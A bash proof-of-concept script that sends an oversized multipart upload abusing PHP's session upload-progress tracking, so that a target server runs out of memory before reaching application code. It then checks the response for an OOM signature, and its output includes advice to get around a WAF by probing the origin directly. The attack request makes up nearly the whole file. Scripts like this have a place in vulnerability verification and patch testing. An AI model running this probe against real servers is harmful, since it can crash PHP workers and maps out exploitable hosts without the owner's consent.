#!/bin/bash
# php2shell-safe-poc: non-destructive OOM probe
#
# Sends ONE multipart request with an oversized filename, tuned so the
# session.upload_progress tracking crosses memory_limit before the request
# reaches application code. This does not attempt code execution; it only
# checks whether the reported pre-userland OOM signature appears.
#
# Usage: HOST=<host> PATH_=/index.php [PORT=443] bash scripts/probe_oom.sh
set -u

HOST="${HOST:?set HOST=<target host or ip>}"
PATH_="${PATH_:-/index.php}"
PORT="${PORT:-443}"
BND="UctxPoc2026"
SID="u0123456789abcdefghijklmnopqrstuv"
NAMELEN="${NAMELEN:-1300000}"

WORKDIR="$(mktemp -d)"
trap 'rm -rf "$WORKDIR"' EXIT

{
  printf -- '--%s\r\n' "$BND"
  printf 'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n%s\r\n' "$SID"
  printf -- '--%s\r\n' "$BND"
  printf 'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
  printf -- '--%s\r\n' "$BND"
  printf 'Content-Disposition: form-data; name="f"; filename="'
  python3 -c "import sys; sys.stdout.write('N'*$NAMELEN)"
  printf '"\r\n\r\n'
  python3 -c "import sys; sys.stdout.buffer.write(b'A'*6144)"
  printf '\r\n--%s--\r\n' "$BND"
} > "$WORKDIR/arm_body.bin"

echo "Sending probe to https://$HOST:$PORT$PATH_ ..."
RESP=$(curl -sk -i -X POST "https://$HOST:$PORT$PATH_" \
  -H "Cookie: PHPSESSID=$SID" \
  -H "Content-Type: multipart/form-data; boundary=$BND" \
  --data-binary @"$WORKDIR/arm_body.bin")

echo "$RESP"
echo
if echo "$RESP" | grep -q "HTTP/1.1 500" && echo "$RESP" | grep -qi "exhausted" && echo "$RESP" | grep -q "line 0"; then
  echo "[RESULT] Pre-userland OOM signature observed (500 + 'exhausted ... in Unknown on line 0')."
  echo "         This indicates the probed code path is reachable."
elif echo "$RESP" | grep -q "HTTP/1.1 403"; then
  echo "[RESULT] Blocked (403) before reaching the application — likely a WAF/CDN in front."
  echo "         Re-run against the origin directly to test the app, or see verify_waf.sh."
elif echo "$RESP" | grep -q "HTTP/1.1 200"; then
  echo "[RESULT] Clean 200 — either patched, session.upload_progress disabled, or the"
  echo "         memory_limit/post_max_size ratio doesn't trigger the condition on this build."
else
  echo "[RESULT] Unrecognized response — inspect manually."
fi

echo
echo "Follow-up: check whether the worker survived:"
echo "  curl -sk -i \"https://$HOST:$PORT$PATH_\""
